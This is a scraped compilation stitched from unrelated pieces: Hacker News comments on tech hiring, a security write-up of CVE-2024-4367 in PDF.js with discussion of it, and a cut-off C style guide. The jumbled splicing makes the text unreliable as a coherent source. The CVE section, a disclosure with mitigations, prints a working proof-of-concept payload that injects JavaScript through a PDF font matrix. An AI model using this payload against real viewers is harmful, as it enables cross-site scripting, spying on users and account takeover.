I don't care how many technically aligned recruiters you've read articles from over the years, the simple fact of the matter is that the people who are at the top of the leaderboards at these companies couldn't give two shits about the technology. Their job is to land asses in seats, and they are ultimately in a vastly better position if they focus and refine their talents on selling and networking as opposed to learning about the problem domain. I still keep in touch with people from my recruiting days, and the high school dropout with 3 years experience when I joined a company is still a senior manager over the Cornell grad. They both make excellent money, but the dropout is easily the better salesperson. When you've interviewed enough people, you can sniff out the bullshit artists, and virtually all decent to great candidates have a certain cadence to how they describe their roles and responsibilities regardless of the tech stack. I don't need to know the ins and outs of SAP AR and Treasury, I just need to know that the candidate has a consistent work history, is up to date, and can confidently describe their work. Client managers are more likely to go back to recruiters who can consistently put candidates in front of them, which is yet another reason why the numbers / networking game is more important. reply smsm42 37 minutes agoprevI was just thinking the other day about writing exactly this post. I've been many times on the hiring side as the interviewer, and now also am on the employee side. On both sides, the process looks extremely broken and extremely frustrating. People in the system sometimes help to get it from \"screaming eldritch horror\" level to \"root canal every day for a month\" level but I'd still easily nominate this as the worst problem in the industry, without even a shred of a solution surfacing so far. We are wasting an enormous amounts of money and effort. I know that employers spend month to look for a suitable candidate, and I know there are thousands of qualified candidates - myself included - spending months in doing process dances that frequently lead nowhere despite there being thousands of jobs matching them and being unfulfilled. And this is not a temporary phenomenon - this is going on for years and decades, without any shred of a solution. In fact, it's probably getting worse - with the industry growing, the amount of jobs you have to sort through to get some prospects is humongous. You have to reduce the amount of effort you spend to each position. Which in turn prompts the employer to erect more filters because they are afraid of low-effort submissions. And the high-effort submissions are lost in those filters so often that it becomes useless to do anything but low-effort. I mean, how many thoughtful, detailed, well-researched, specific to a position, cover letters can you write in a day? Now many you are willing to, when you know probably nobody would even read it because cheap AI would just scan it for keywords anyway? So, the cost and the length of the process is rising.

You need to know someboody. https://en.wikipedia.org/wiki/The_Market_for_Lemons reply Fileformat 4 hours agoparentI think this points to the real problem: it is hard to evaluate how \"good\" someone is during the hiring process Lots of great coders don't have a big open presence. Years of experience isn't a good sign with the churn in tech, plus you don't know if they wrote code or just watched. Is being able to do a l33t coding exercise in a fixed time a sign? IMHO I'm decent programmer and I've failed them. Can you come up with an exercise that matches the work that will be done and can be completed in a reasonable amount of time? And the phrase \"matches the work that will be done\" is doing some heavy lifting: many companies don't really know what they need. I've seen companies that need 99% soft skills that want a ton of niche tech experience. Or advertise for something other than the real dumpster-fire that you'll have to work on. This is the fundamental reason that knowing someone works: they know your coding skills and they can give you the inside scoop on the position. reply thayne 4 hours agoparentprevThat isn't quite the same. In the job market, leaving the market isn't really an option for the seller (employee), unless you are independently wealthy. So you generally have to settle for a price that is lower than your worth. There is also insufficient information going the other way. Unlike buying a car, there is more to the buyer's side than just money. There is the work environment, how well employees are treated, the probability of future raises, probability the company will lay you off or cut pay or force you to relocate in the future, etc. And that assymetry impacts the market as well. For example a company might be a really great place to work, and that would compensate for a lower salary, but the prospective employee doesn't know that. reply sparker72678 4 hours agoparentprevThe best way to get a job _has always been, and will always be_, knowing somebody.

You're getting canned responses because a human probably never even saw your resume. The other issue is that there is a small amount of people are _extremely_ unstable. Giving them any kind of feedback encourages them to harrass the company and employees. It's like 1% of applicants, but when you're dealing with this many people it means you are guaranteed to run into someone like this, so it's often policy not to give specific feedback. reply ricardoplouis 4 hours agoprevOur workforce is more educated now than at any point in history. This means we'll have more and more people competing for jobs they are overqualified for. From a job seeker perspective, it will only get harder as the traditional credentials have lost their value. I've also been on the hiring perspective and I can tell you there is no shortage of candidates, nor do companies have a hard time finding employees. The problem is that they either: A: Want top talent without paying the premium B: Want top talent for a role that doesn't require it If you ask any hiring manager, they'll always prefer the senior talent over the junior one, even if the role doesn't require it. But once they see the rates that senior talent commands, they might adjust their expectations. I don't think there is any dream solution given that the problem is more cultural than anything. If anything, the market will loosen up in favor of the hiring managers in the long run, but continue to squeeze workers given our current trajectory. reply GenerocUsername 4 hours agoprevAt my company we have no issues hiring 50 remote Indian nationals who all have the exact same Java based resume, but we will spend a full quarter interviewing for a senior web developer (non Indian) reply lammalamma25 4 hours agoparentThis matches my experience.

The job market is tight, but not fucked. When tight it does not have the stomach to employee warm bodies. The fix is lowerred expectations from job seekers and the long term fix is schools need to become hard again and stop being a product. We need weed out classes, the goal is not to graduate as many as we can, it’s to educate.

I have been job hunting for over 6 months. It has been extremely difficult, but I should be getting a solid offer within the next few weeks. My short term career goals are to slightly increase my zero-interest rate era salary era, and find an intellectually exciting project. In the EU, most \"exciting\" companies are either wannabe FAANGs with a minuscule fraction of the operational ability and success, or middling startups that took way too much VC money in the zero interest era, and are now micromanaged by those VCs because they want their money back. I've worked for those people already, and it sucks. When the economy isn't good, HR people suffer from some psychosis that makes them ask you all kinds of random or creepy questions that are tangential to software engineering. My guess is that they are looking for people who are as burnt out and soulless as they are. It can be exhausting. My advice is to trust your gut and run away from recruiters and interviews that give you even the slightest red flags. It almost never pays off to be patient, and chances are that you will find dozens of equivalent job ads in the next few days. To make progress in the software industry, you have to learn to navigate the sea of crap. reply koliber 4 hours agoprevThere is no magic solution here. Nor is this a new problem. If you're on the employer side, you need to define your role well, build a hiring funnel, decide how you will market the role, and then run the pipeline. Vet CVs, pre-qualify, interview, interview, interview, pre-hire, trial-period hire, and then work hard at retaining the people who you like working with. Each step of the pipeline can be debugged. There are solutions to every problem. Not enough candidates? Are people finding the ad? Are people reading the ad? Are people engaging? Why? Why not? Test - reword, change the compensation range, change the perks, or conditions. If you're looking for a job, you also have a funnel. You search for job, read the posting, decide to apply, apply, followup, answer questionnaires, interview, interview, interview, go through pre-hiring, and then try to deliver value. Again, each step can be analyzed and debugged. Doing this from either side is actual work. On the employer side, you have hiring managers, HR, internal recruiters, external recruiters, interviewers, and other roles and services that help you run the hiring show. I've been doing this for a while, in various roles. Sometimes I wear an internal recruiter hat. Sometimes the interviewer hat. Sometimes the operations hat. Right now I provide a service for companies in the US who don't want to deal with outsourcing firms or the intricacies of hiring abroad but want to build an offshore dev hub in Europe. Part outsourcing, part recruiting, part organizational design, part employer of record. At other times, I've managed sizable engineering teams for tech startups. Over time, the problem changes - sometimes it's harder to find devs, sometimes it is easier. But the approach is always similar. reply marcosdumay 4 hours agoprevThere used to exist a professional attestation market, where people could get useful certificates and distinguish themselves on the job market.

Medium touch hiring (Hired dot com / trilobyte) doesn't scale like recruiting firms tend not to scale well, so there's good small/medium business there, but technology can't fix the human incentive problems so they end up succumbing to the same issues and the problem comes back. reply rayiner 4 hours agoprevIt’s not paradoxical if you account for the normal distribution in employee talents, and companies are unrealistic about expectations. Big companies still have the mentality of startups, thinking that they can fill their ranks with top 10% people who are super self motivated and able to handle complex tasks with minimal management and training. Maybe that’s possible when you’re hiring three people at a startup, but it’s not possible when you’re hiring 300 people. Tech is now like the car industry. Google and Microsoft and Apple are like GM and Ford and Chrysler. And most of the startups are parts suppliers feeding into that ecosystem. They’re going to have to learn how to execute their core functions by appropriately training and supervising line workers. reply WaitWaitWha 3 hours agoprevI think there are several issues in this area. Certifications are useless and sadly necessary. Certifications are substitutes or proxy to validate one's expertise in the field the cert is in. Alas, most certification organizations concentrating on how to rake in more money, not how validate someone's knowledge. Hiring managers & recruiters often mistake certification for experience versus knowledge and soft skills. (Let's not even talk about the crammers, cert cheats, etc.) The intermediary between hiring team and candidate supposed to be recruitment or HR. As others have noted, often recruitment does not know how to properly translate the requirement, they force-insert themselves into the recruitment process. A MITM attack. From hiring perspective, I have seen a few new trends I have not seen before. AI generated resumes/CVs to match the job offer.

Research Thomas Rinsma 05-20-2024 CVE-2024-4367 – Arbitrary JavaScript execution in PDF.js Share article TL;DR This post details CVE-2024-4367, a vulnerability in PDF.js found by Codean Labs. PDF.js is a JavaScript-based PDF viewer maintained by Mozilla. This bug allows an attacker to execute arbitrary JavaScript code as soon as a malicious PDF file is opened. This affects all Firefox users (> endobj 2 0 obj > endobj 3 0 obj > ... (actual binary font data) ... endobj The dict referenced by the code above refers to the Font object. Hence, we should be able to define a custom FontMatrix array like this: 1 0 obj > endobj When attempting to do this it initially looks like this doesn’t work, as the transform operations in generated Function bodies still use the default matrix. However, this happens because the font file itself is overwriting the value. Luckily, when using a Type1 font without an internal FontMatrix definition, the PDF-specified value is authoritative as the fontMatrix value is not overwritten. Now that we can control this array from a PDF object we have all the flexibility we want, as PDF supports more than just number-type primitives. Let’s try inserting a string-type value instead of a number (in PDF, strings are delimited by parentheses): /FontMatrix [1 2 3 4 5 (foobar)] And indeed, it is plainly inserted into the Function body! c.save(); c.transform(1,2,3,4,5,foobar); c.scale(size,-size); c.moveTo(0,0); c.restore(); Exploitation and impact Inserting arbitrary JavaScript code is now only a matter of juggling the syntax properly. Here’s a classical example triggering an alert, by first closing the c.transform(...) function, and making use of the trailing parenthesis: /FontMatrix [1 2 3 4 5 (0\\); alert\\('foobar')] The result is exactly as expected: Exploitation of CVE-2024-4367 You can find a proof-of-concept PDF file here. It is made to be easy to adapt using a regular text editor. To demonstrate the context in which the JavaScript is running, the alert will show you the value of window.origin. Interestingly enough, this is not the file:// path you see in the URL bar (if you’ve downloaded the file). Instead, PDF.js runs under the origin resource://pdf.js. This prevents access to local files, but it is slightly more privileged in other aspects. For example, it is possible to invoke a file download (through a dialog), even to “download” arbitrary file:// URLs. Additionally, the real path of the opened PDF file is stored in window.PDFViewerApplication.url, allowing an attacker to spy on people opening a PDF file, learning not just when they open the file and what they’re doing with it, but also where the file is located on their machine. In applications that embed PDF.js, the impact is potentially even worse. If no mitigations are in place (see below), this essentially gives an attacker an XSS primitive on the domain which includes the PDF viewer. Depending on the application this can lead to data leaks, malicious actions being performed in the name of a victim, or even a full account take-over. On Electron apps that do not properly sandbox JavaScript code, this vulnerability even leads to native code execution (!). We found this to be the case for at least one popular Electron app. Mitigation At Codean Labs we realize it is difficult to keep track of dependencies like this and their associated risks. It is our pleasure to take this burden from you. We perform application security assessments in an efficient, thorough and human manner, allowing you to focus on development. Click here to learn more. The best mitigation against this vulnerability is to update PDF.js to version 4.2.67 or higher. Most wrapper libraries like react-pdf have also released patched versions. Because some higher level PDF-related libraries statically embed PDF.js, we recommend recursively checking your node_modules folder for files called pdf.js to be sure. Headless use-cases of PDF.js (e.g., on the server-side to obtain statistics and data from PDFs) seem not to be affected, but we didn’t thoroughly test this. It is also advised to update. Additionally, a simple workaround is to set the PDF.js setting isEvalSupported to false. This will disable the vulnerable code-path. If you have a strict content-security policy (disabling the use of eval and the Function constructor), the vulnerability is also not reachable.

You realize this particular problem requires JS to solve, right? It's not just there arbitrarily. That's like saying your approach to web application hardening is to disable all inbound connections. You quite necessarily need those for a web application. I can't see how this would be pragmatic or productive, or maybe it's not meant to be. reply amluto 2 hours agorootparent> You realize this particular problem requires JS to solve, right? It's not just there arbitrarily. Most of the time, you get better results by just serving up the PDF as Content-Disposition: inline. 90% of JavaScript PDF viewers are crap (although PDF.js is decent), but the browser on all dignified platforms still does better than any fancy JavaScript I’ve ever seen. Loads faster, too. reply megadal 2 hours agorootparentPeople don't usually use PDF.js just to render PDFs. You can also extract text to use within a web application, preview a PDF, have users sign PDFs and fill forms in the browser (where their authenticated context resides) and a host of other things. I don't think anyone but a bored hobbyist is implementing or using a JS PDF renderer solely for rendering and the people who are using it for the aforementioned reasons don't care about load times, the document has to be processed somehow by the user agent. The suggestion that JS is optional here is nonsense and that the built in browser PDF renderer (written in a lower level language than JS) is faster is common knowledge. Again, I don't see how this suggestion is pragmatic or productive, but still, maybe we're not trying to be here. reply kevin_thibedeau 1 hour agorootparentPDF forms don't require JS. reply megadal 1 hour agorootparentThey do if your want to fill them out in the browser coupled with an authenticated context, which is usually pretty important for forms. Usually you don't just want random users filling out any data within your enterprise. You also can prepopulate the form with user input from previous webpages/the user account. This is how a lot of HRISes do it. Usually people want onboarding to be as frictionless as possible. Downloading the PDF and using some editor outside the website then coming back to upload it counts as friction. And this conversation is still far away from the point: you need JS for a JS based PDF renderer, and there are valid uses cases where one is required. reply bguebert 1 hour agorootparentprevI mean firefox's built in pdf reader is PDF.js. Also the desktop version of adobe reader used to run javascript embedded in pdfs by default as a \"feature\". I'm not sure you can get away from it at this point, but it would be nice to have the option to just use a desktop pdf reader that doesn't even support javascript or running any code embedded in the pdf. Maybe my use case is limited but I don't see the point of it. If you want interactivity you can use a website so people can expect that sort of stuff. reply masklinn 4 hours agorootparentprevThe advice is sound... mostly: there are ways to relax the different-origin nature of subdomains so you'd have to ensure that you're not using them, and some web properties have relaxed SOP by default e.g. cookies, renderer processes, ..., the public suffix list exists to try and mitigate these issues. Frankly I'd just disable script evaluation if you don't specifically need that. reply tgsovlerkhgsel 3 hours agorootparent> I'd just disable script evaluation if you don't specifically need that.

And how do you know whether you \"specifically need that\"? As the answer says, it's not for scripting within the pdf itself, it's for optimizing font rendering. For pdfs that you don't control, it's basically impossible to know whether that'd be needed or not. Even for pdfs that you do control, in a large company it's very likely that the team that's configuring pdf.js isn't talking to the team that generates the pdfs, which means you have a similar problem. reply baobabKoodaa 5 hours agorootparentprevWhat is wrong with that accepted answer? reply daghamm 1 hour agorootparentFor one, every security disaster starts with people listening to a random guy claiming that the probability of something being exploitable is virtually zero :) People who have been in this game more than six months would never making such a claim. And only XSS? What does that mean in the context of the page, or an electron app? How can this guy know \"just an XSS\" is not catastrophic? reply baobabKoodaa 1 hour agorootparentI think you're being unnecessarily harsh. First off, are we not supposed to have \"random guys\" writing stuff on Stack Overflow and Wikipedia? Because that's kind of how those websites work: they rely on \"random guys\" to do all of the writing, rather than relying on credentialed experts only. I sure think Stack Overflow and Wikipedia are very useful resources despite having \"random guys\" do all the writing. Secondly, you attack the random guy for... correctly identifying that \"the worst it can do is an XSS attack\". This is very useful and accurate information. Information like this is typically absent from all kinds of vulnerability disclosures. When you read on the news that something something has a vulnerability, they typically they don't give you the practically useful bit of information, like what is the practical scope. Is it a 0-click RCE or is it a XSS inside a web app? They don't tell you. Except this random guy, who accurately identifies this information. > How can this guy know \"just an XSS\" is not catastrophic? \"Just an XSS\" is the correct description of the severity here. reply cxr 23 minutes agorootparent> I think you're being unnecessarily harsh.

Not only does it correctly identify the attack vector of this CVE, but I think his advice on how to mitigate it is sound. Is there something I'm missing? The only flaw I see is that it doesn't consider the implications of using PDF.js in Electron. reply tgsovlerkhgsel 3 hours agorootparentprevIt's not even incorrect. The option isn't supposed to allow XSS-by-design (which the original requester was worried about), the possibility of a vulnerability is mentioned, the impact of a vulnerability is correctly described (XSS not RCE or similar), and mitigations that would effectively limit the impact of such a vulnerability are presented (separate origin). reply kibwen 5 hours agoprevArbitrary code execution, though only of Javascript, so (as far as the browser use case is concerned) the risk compared to visiting any website (other than the potential for XSS) is that the context that it's running in is slightly elevated (though still much less than having full control of your machine): > PDF.js runs under the origin resource://pdf.js. This prevents access to local files, but it is slightly more privileged in other aspects. For example, it is possible to invoke a file download (through a dialog), even to “download” arbitrary file:// URLs. Additionally, the real path of the opened PDF file is stored in window.PDFViewerApplication.url, allowing an attacker to spy on people opening a PDF file, learning not just when they open the file and what they’re doing with it, but also where the file is located on their machine. reply toxik 5 hours agoparentIf you can upload a PDF and have it served on the root domain, eg, gmail.com, then you can do session hijacking and other XSS. It’s actually pretty bad. XSS used to be thought of as “not that bad”, but today it is considered pretty bad. reply kibwen 4 hours agorootparentYes, I'm not here to downplay the severity of XSS. Rather, I'm trying to be specific about the potential attack vector here. If you're just viewing a PDF using the built-in pdf.js in Firefox, then (AFAIK) it doesn't matter what site you downloaded it from, because pdf.js isn't running in the context of the website, so it doesn't have access to that site's locally-stored data (including cookies). Instead it's running in the origin mentioned above, with the accompanying concerns. So the XSS (again, as far as a web browser is concerned) would be if the site itself is shipping pdf.js for viewing PDFs inside the webpage itself. As you suggest, Gmail lets you preview PDFs, so XSS would be a concern there, but only if Gmail is using pdf.js. reply tgsovlerkhgsel 3 hours agorootparentprevHow would serving the PDF on a sensitive origin help the attacker? Wouldn't they need to serve the vulnerable PDF viewer on a sensitive origin? reply toxik 3 hours agorootparentRight, that is correct, it is what I meant to say.

Depending on the application this can lead to data leaks, malicious actions being performed in the name of a victim, or even a full account take-over. On Electron apps that do not properly sandbox JavaScript code, this vulnerability even leads to native code execution (!).

Unfortunately, applications that produce broken PDFs are rife, and Postel's law sets the expectation that we should consume garbage and be happy. reply notnullorvoid 28 minutes agoparentPostel's law should not be applied so broadly, and certainly shouldn't be used as an argument against further validation of inputs. Garbage inputs are the responsibility of the sender, not the receiver. You can and should accept a small margin of error in inputs where errors may logically appear, but if the receiver accepts too much error then it becomes responsible by creating a complicit norm. If the responsibility of error remains on the sender then introducing further validation is less likely to cause breakage in communication. reply issafram 49 minutes agoprev> This affects all Firefox users ( Instead, PDF.js runs under the origin resource://pdf.js.

    "originBody": "C Style These are my favorite C programming practices. Some rules are as trivial as style, while others are more intricate. I follow a few rules religiously, and others I use as a guideline. I prioritize correctness, readability, simplicity and maintainability over speed because premature optimization is the root of all evil. Write correct, readable, simple and maintainable software, and tune it when you're done, with benchmarks to identify the choke points. Also, modern compilers will change computational complexities. Simplicity can often lead you to the best solution anyway: it's easier to write a linked list than it is to get an array to grow, but it's harder to index a list than it is to index an array. Backwards compatibility (e.g. ANSI C) is rarely important to me. In my opinion, backwards compatibility holds everyone back. I think we should use new technologies and new techniques if we can, to move everyone forward, if only a bit. If you don't agree with something here, that's perfectly fine. Pick and choose what you like, and what works for your own situation. These rules aren't intended to be universal admonitions about quality: they're just my preferences, and work well for what I do, and what I care about. Writing this guide has made me deeply consider, and reconsider, best C programming practices. I've changed my opinion multiple times on many of the rules in this document. So, I'm certain I'm wrong on even more points. This is a constant work-in-progress; issues and pull-requests are very welcome.

Always develop and compile with warnings on. It turns out, though, that -Wall and -Wextra actually don't enable \"all\" warnings. There are a few others that can be really helpful: CFLAGS += -Wall -Wextra -Wpedantic \\ -Wformat=2 -Wno-unused-parameter -Wshadow \\ -Wwrite-strings -Wstrict-prototypes -Wold-style-definition \\ -Wredundant-decls -Wnested-externs -Wmissing-include-dirs # GCC warnings that Clang doesn't provide: ifeq ($(CC),gcc) CFLAGS += -Wjump-misses-init -Wlogical-op endif Compiling with optimizations on can also help to detect errors: CFLAGS += -O2 Use GCC's and Clang's -M to automatically generate object file dependencies The GNU Make Manual touches on how to automatically generate the dependencies of your object files from the source file's #includes. The example rule given in the manual is a bit complicated. Here's the rules I use: depfiles = $(objects:.o=.d) # Have the compiler output dependency files with make targets for each # of the object files. The `MT` option specifies the dependency file # itself as a target, so that it's regenerated when it should be. %.dep.mk: %.c$(CC) -M -MP -MT '$( $@ # Include each of those dependency files; Make will run the rule above # to generate each dependency file (if it needs to). -include $(depfiles) Write to the most modern standard you can C11 is better than C99, which is (far) better than C89. C11 support is still coming along in GCC and Clang, but many features are there. If you need to support other compilers in the medium-term, write to C99. Always write to a standard, as in -std=c11. Don't write to a dialect, like gnu11. Try to make do without non-standard language extensions: you'll thank yourself later. We can't get tabs right, so use spaces everywhere The idea of tabs was that we'd use tabs for indentation levels, and spaces for alignment. This lets people choose an indentation width to their liking, without breaking alignment of columns. int main( void ) { |tab |if ( pigs_can_fly() == true ) { |tab ||tab |developers_can_use_tabs( \"and align columns \" |tab ||tab\"with spaces!\" ); |tab |} } But, alas, we (and our editors) rarely get it right. There are four main problems posed by using tabs and spaces: Tabs for indentation lead to inconsistencies between opinions on line lengths. Someone who uses a tab width of 8 will hit 80 characters much sooner than someone who uses a tab width of 2. The only way to avoid this is to require a tab-width, which eliminates the benefit of tabs. It's much harder to configure your editor to correctly handle tabs and spaces for each project, than it is to just handle spaces. See also: Tabs vs Spaces: An Eternal Holy War It's harder to align things using only the space bar. It's much easier to hit tab twice than to hold the space bar for eight characters. A developer on your project will make this mistake eventually. If you use spaces for indentation and alignment, you can hit the tab key in either situation, which is quick, easy and not prone to errors. It's easier to prevent tab/space errors on projects that use only spaces, because all they need to do is detect for any tabs at all. To prevent against tabs used for alignment on a project that uses tabs, you'll need to come up with a regular expression. Cut the complexity, and use spaces everywhere. You may have to adjust to someone else's indent width every now and then. Tough luck! Never have more than 79 characters per line Never write lines longer than 79 characters. 80-characters-per-line is a de-facto standard for viewing code. Readers of your code who rely on that standard, and have their terminal or editor sized to 80 characters wide, can fit more on the screen by placing windows side-by-side. You should stick to a maximum of 79 characters so that there's always a space in the last column. This makes it more obvious the line doesn't continue onto the next line. It also provides a right-hand margin. If you go over 80 characters, you're making your code significantly harder to read for people who try to rely on the 80-columns standard. Either your line will wrap, which is hard to read, or your readers will have to scroll the window to the right to get the last few characters. Either of these results in code that's harder to read than if you had just worked out a line-break yourself. It's harder to read long lines because your eyes have to travel further to get to the start of the next line, and the further they have to go, the more likely you'll have to visually readjust. 100-wide and 120-wide styles are easier to write, but harder to read. It can be very tempting to let a line here or there go over 79 characters, but your readers will pay the price every time they have to read such a line. Treat 79 characters as a hard limit - no ifs or buts. Work out how best to break long lines, and your readers will thank you. Do what everyone else is doing, and write for 80-column views, and we'll all be better off. Emacs Wiki: Eighty Column Rule Programmers' Stack Exchange: Is the 80 character limit still relevant? Use // comments everywhere, never /* ... */ Stick to single-line comments, and cut the complexity. Compared to single-line comments, multi-line comments: are rarely used with a blank margin, so they're just as character-heavy have a style, which has to be specified and adhered to often have */ on its own line, so they're more line-expensive have weird rules about embedded /* and */ are harder/impossible to block-edit, and to extend are more visually-cluttering than // You have to use /* ... */ for inline comments in multi-line #defines, though: #define MAGIC( x ) \\ /* Voodoo magic happens here. */ \\ ... But I often prefer to just add // comments after the macro body describing the tricky bits. I think this makes the macro body easier to read, but still provides the (much-needed) documentation. Program in American English Developing in the same language, using the same spelling and vocabulary, is important. This is especially true in free-software projects with contributors from around the world. You should use the same language consistently for your project, in code, comments and documentation. So, for American English, write color, flavor, center, meter, neighbor, defense, routing, sizable, burned, and so on (see more). I'm Australian, but I appreciate that most programmers will be learning and using American English. Also, American English spelling is consistently more phonetic and consistent than British English. British English tends to evolve towards American English for this reason, I think. Comment non-standard-library #includes to say what symbols you use from them Namespaces are one of the great advances of software development. Unfortunately, C missed out (scopes aren't namespaces). But, because namespaces are so fantastic, we should try to simulate them with comments. #include// Test, tests_run #include \"trie.h\" // Trie, Trie_* This provides a few benefits: readers aren't forced to refer to documentation or use grep to find out where a symbol is defined (or, if you don't follow the rule below, where it comes from): your code just tells them developers have a hope of being able to determine which #includes can be removed and which can't developers are forced to consider namespace pollution (which is otherwise ignored in most C code), and encourages them to only provide small, well-defined headers The downside is that the #include comments aren't checked or enforced. I've been intending to write a checker for this for quite some time, but for now, there's nothing to stop the comments from becoming wrong - either mentioning symbols that aren't used anymore, or not mentioning symbols that are used. In your project, try to nip these problems in the bud, to stop it from spreading. You should always be able to trust your code. This maintenance is annoying, for sure, but I think #include comments are worth it in aggregate. Finding where things come from is always one of my main challenges when learning a codebase. It could be a whole lot easier. I've never seen any projects that write #include comments like this, but I'd love to see it become a thing. #include the definition of everything you use Don't depend on what your headers include. If your code uses a symbol, include the header file where that symbol is defined. Then, if your headers change their inclusions, your code won't break. Also, combined with the #include comment rule above, this saves your readers and fellow developers from having to follow a trail of includes just to find the definition of a symbol you're using. Your code should just tell them where it comes from. Avoid unified headers Unified headers are generally bad, because they relieve the library developer of the responsibility to provide loosely-coupled modules clearly separated by their purpose and abstraction. Even if the developer (thinks she) does this anyway, a unified header increases compilation time, and couples the user's program to the entire library, regardless of if they need it. There are numerous other disadvantages, touched on in the points above. There was a good exposé on unified headers on the Programmers' Stack Exchange. An answer mentions that it's reasonable for something like GTK+ to only provide a single header file. I agree, but I think that's due to the bad design of GTK+, and it's not intrinsic to a graphical toolkit. It's harder for users to write multiple #includes just like it's harder for users to write types. Bringing difficulty into it is missing the forest for the trees. Provide include guards for all headers to prevent double inclusion Include guards let you include a header file \"twice\" without it breaking compilation. // Good #ifndef INCLUDED_ALPHABET_H #define INCLUDED_ALPHABET_H ... #endif // ifndef INCLUDED_ALPHABET_H Rob Pike argues against include guards, saying you should just never include files in include files. He says that include guards still \"result in thousands of needless lines of code passing through the lexical analyzer\". In fact, GCC will detect include guards, and won't read such files a second time. I don't know if other compilers perform this optimization. I don't think it's a good idea to require your users include the dependencies of your header files. Your header file's dependencies shouldn't really be considered \"public\". It would enforce the rule \"don't depend on what your header files include\", but it falls apart as soon as header files are using things you don't need, like FILE or bool. Users shouldn't have to care about that if they don't need it themselves. So, always write include guards, and make your users' lives easy. Always comment #endifs of large conditional sections No global or static variables if you can help it (you probably can) Global variables are just hidden arguments to all the functions that use them. They make it really hard to understand what a function does, and how it is controlled. Mutable global variables are especially evil and should be avoided at all costs. Conceptually, a global variable assignment is a bunch of longjmps to set hidden, static variables. Yuck. You should always try to design your functions to be completely controllable by their arguments. Even if you have a variable that will have to be passed around to lots of a functions - if it affects their computation, it should be a argument or a member of a argument. This always leads to better code and better design. For example, removing global variables and constants from my Trie.c project resulted in the Alphabet struct, which lets users tune the storage structure to their needs. It also opened up some really cool dynamic abilities, like swapping alphabets on the fly for the same trie. Static variables in functions are just global variables scoped to that function; the arguments above apply equally to them. Just like global variables, static variables are often used as an easy way out of providing modular, pure functions. They're often defended in the name of performance (benchmarks first!). You don't need static variables, just like you don't need global variables. If you need persistent state, have the function accept that state as a argument. If you need to return something persistent, allocate memory for it. Minimize what you expose; declare top-level names static where you can Your header files should only include things that users need to use your library. Internal functions or structs or macros should not be provided here; declare them in their respective source files. If it's needed among multiple source files, provide an internal header file. If a function or global variable isn't exported in the header, declare it as static in the source file to give it internal linkage. This eliminates the chance of name-clashes among object files, enables a few optimizations, and can improve the linking speed. Immutability saves lives: use const everywhere you can const improves compile-time correctness. It isn't only for documenting read-only pointers. It should be used for every read-only variable and pointee. const helps the reader immensely in understanding a piece of functionality. If they can look at an initialization and be sure that that value won't change throughout the scope, they can reason about the rest of the scope much easier. Without const, everything is up in the air; the reader is forced to comprehend the entire scope to understand what is and isn't being modified. If you consistently use const, your reader will begin to trust you, and will be able to assume that a variable that isn't qualified with const is a signal that it will be changed at some point in the scope. Using const everywhere you can also helps you, as a developer, reason about what's happening in the control flow of your program, and where mutability is spreading. It's amazing, when using const, how much more helpful the compiler is, especially regarding pointers and pointees. You always want the compiler on your side. The compiler will warn if a pointee loses constness in a function call (because that would let the pointee be modified), but it won't complain if a pointee gains constness. Thus, if you don't specify your pointer arguments as const when they're read-only anyway, you discourage your users from using const in their own code: // Bad: sum should define its array as const. int sum( int * xs, int n ); // Because otherwise, this will be a compilation warning: int const xs[] = { 1, 2, 3 }; return sum( xs, sizeof xs ); // => warning: passing argument 2 of ‘sum’ discards ‘const’ // qualifier from pointer target type Thus, using const isn't really a choice, at least for function signatures. Lots of people consider it beneficial, so everyone should consider it required, whether they like it or not. If you don't use const, you force your users to either cast all calls to your functions (yuck), ignore const warnings (asking for trouble), or remove those const qualifiers (lose compile-time correctness). If you're forced to work with a library that ignores const, you can write a macro that casts for you: // `sum` will not modify the given array; casts for `const` pointers. #define sum( xs, n ) sum( ( int * ) xs, n ) Only provide const qualifiers for pointees in function prototypes - const for the argument names themselves is just an implementation detail. // Unnecessary bool Trie_has( Trie const, char const * const ); // Good bool Trie_has( Trie, char const * ); Unfortunately, C can't handle conversions from non-const pointee-pointees to const pointee-pointees. Thus, I recommend against making pointee-pointees const. char ** const xss = malloc( 3 * ( sizeof char * ) ); char const * const * const yss = xss; // Warning: initialization from incompatible pointer type char * const * const zss = xss; //If you can const the pointees of your internal structs, do. Non-constant pointees can cause mutability to needlessly spread, which makes it harder to glean information from the remaining const qualifiers. Because you have total control over your internal structs, if you need to remove the const in future, you can. You usually shouldn't const the pointees of your external structs. Flexibility is important when they're part of the public interface. Consider it carefully. An exception to this that I often make is for fields are best assignable to string literals, such as error fields. In this case, a char const * type prevents you and your users from modifying the underlying string literals, which would prompt a segmentation fault. While it can be reasonable to const the pointees of struct fields, it's never beneficial to const the struct fields themselves. For example, it makes it painful to malloc a value of that struct. If it really makes sense to stop the fields from changing beyond their original values, just define invariants that enforce whatever qualities you need. Also, you and your users can just define individual variables of that struct as const to get the same effect. Only make return-type pointees const if you need to, and after careful consideration. I've found that when the compiler is hinting to add a const to a return type, it often means that a const should be removed somewhere; not added. It can harm flexibility, so be careful. Finally, never use typecasts or pointers to get around const qualifiers - at least, for things you control. If the variable isn't constant, don't make it one. Always put const on the right and read types right-to-left const char * word; // Bad: not as const-y as it can be const char * const word; // Bad: makes types very weird to read char const* const word; // Bad: weird * placement // Good: right-to-left, word is a constant pointer to a constant char char const * const word; Because of this rule, you should always pad the * type qualifier with spaces. Don't write argument names in function prototypes if they just repeat the type But, always declare the name of any pointer argument to communicate if it's a pointer-to-array (plural name) or a pointer-to-value (singular name). bool trie_eq( Trie trie1, Trie trie2 ); // Bad bool trie_eq( Trie, Trie ); // Good // Bad - are these pointers for modification, nullity, or arrays? void trie_add( Trie const *, char const * ); // Good void trie_add( Trie const * trie, char const * string ); Use double rather than float, unless you have a specific reason otherwise From 21st Century C, by Ben Klemens: printf( \"%f\", ( float )333334126.98 ); // 333334112.000000 printf( \"%f\", ( float )333334125.31 ); // 333334112.000000 For the vast majority of applications nowadays, space isn't an issue, but floating-point errors can still pose a threat. It's much harder for numeric drift to cause problems for doubles than it is for floats. Unless you have a very specific reason to use floats, use doubles instead. Don't use floats \"because they will be faster\", because without benchmarks, you can't know if it actually makes any discernible difference. Finish development, then perform benchmarks to identify the choke-points, then use floats in those areas, and see if it actually helps. Before then, prioritize everything else over any supposed performance improvements. Don't prematurely optimize. Declare variables as late as possible Declaring variables where they're used reminds the reader of the type they're working with. It also suggests where to extract a function to minimize variable scope. Furthermore, it informs the reader as to where each variables are relevant. Declaring variables when they're needed almost always leads to initialization (int x = 1;), rather than just declaration (int x;). Initializing a variable usually often means you can const it, too. To me, all declarations (i.e. non-initializations) are shifty. Use one line per variable definition; don't 